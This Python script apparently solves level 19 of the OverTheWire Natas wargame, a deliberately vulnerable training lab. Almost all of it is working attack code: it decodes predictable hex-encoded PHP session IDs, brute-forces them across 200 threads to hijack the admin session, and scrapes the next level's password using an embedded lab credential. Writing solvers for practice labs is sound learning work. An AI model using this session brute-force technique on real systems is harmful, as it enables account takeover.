if __name__ == '__main__':
    import requests
    def build_url(level): return f'http://natas{level}.natas.labs.overthewire.org/'
    from tqdm import tqdm
else:
    from common import *

import concurrent.futures

MAX_WORKERS = 200

def find_identical(k=5):    # k is number of requests to make
    global MAX_WORKERS
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,he;q=0.8',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://natas19.natas.labs.overthewire.org',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/',
        'Authorization': 'Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw=='
    }
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(MAX_WORKERS, k)) as pool:
        results = pool.map(lambda _: requests.post(build_url(level=19), 'username=admin&password=b', headers=headers), range(k))
    
    ids = []
    for result in results:
        cookie = result.headers['Set-Cookie']
        start = cookie.find('PHPSESSID=') + len('PHPSESSID=')
        ids.append(cookie[start:cookie.find(';', start)])
    
    # convert to characters from hex
    as_chars = []
    for id in ids:
        as_lst = [chr(int(id[i:i+2], 16)) for i in range(0, len(id), 2)]
        as_chars.append(''.join(as_lst))
    
    trailing_equal_chars = 0
    for i in range(1, len(as_chars[0])):
        if as_chars[0][-i] == as_chars[1][-i]:
            trailing_equal_chars += 1
        else:
            break
    
    return as_chars[0][-trailing_equal_chars:]



DONE = False
def test_id(session_id):
    global DONE
    if DONE:
        return False, ''
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,he;q=0.8',
        'Authorization': 'Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Cookie': f'PHPSESSID={session_id}',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0',
    }

    result = requests.get(build_url(level=19), headers=headers)
    if 'Please login with your admin account' in result.text:
        raise Exception(f'Invalid session id {session_id}')
    
    if 'Login as an admin' not in result.text:
        start = result.text.find('Password: ')
        password = result.text[start+len('Password: '):result.text.find('</pre>', start)]
        DONE = True
        return True, password
    return False, ''


def to_hex(string):
    out = ''
    for letter in string:
        out += hex(ord(letter))[2:]
    return out

MAX_VALUE = int(640)
def gen_ids(suffix):
    global MAX_VALUE
    for i in range(MAX_VALUE):
        output = ''
        yield to_hex(str(i)+suffix)

def solve(driver, _=None):
    global MAX_WORKERS, MAX_VALUE
    suffix = find_identical()

    password = ''
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        results = pool.map(test_id, gen_ids(suffix))
    
        for result in tqdm(results, total=MAX_VALUE):
            if result[0]:
                password = result[1]
                break
        else:
            raise Exception('No solving session id found')

    if driver: driver.get(build_url(password = password, level=20))
    return password


if __name__ == '__main__':
    print(solve(None))
    # print(find_identical())
    # for a in gen_ids('-admin'):                             # the suffix is the username, so we want all the one's that end with '-admin'
    #     print(a)